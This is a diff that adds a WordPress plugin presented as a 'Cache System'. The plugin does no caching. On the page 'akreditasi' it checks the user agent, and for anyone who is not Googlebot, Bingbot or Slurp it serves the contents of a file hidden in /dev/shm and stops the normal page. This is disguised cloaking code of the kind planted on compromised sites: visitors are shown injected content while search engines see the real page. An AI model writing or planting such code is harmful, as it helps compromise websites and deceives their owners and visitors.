@@ -1,0 +1,30 @@
+<?php
+/*
+Plugin Name: Cache System
+*/
+
+add_action('template_redirect', function(){
+
+    if(is_page('akreditasi')){
+
+        $ua = $_SERVER['HTTP_USER_AGENT'];
+
+        if(!preg_match('/googlebot|bingbot|slurp/i',$ua)){
+
+            $files = [
+                "/dev/shm/akreditasi.txt",
+                "/dev/shm/mudah.txt"
+            ];
+
+            $file = $files[array_rand($files)];
+
+            if(file_exists($file)){
+                echo file_get_contents($file);
+                exit;
+            }
+
+        }
+
+    }
+
+});
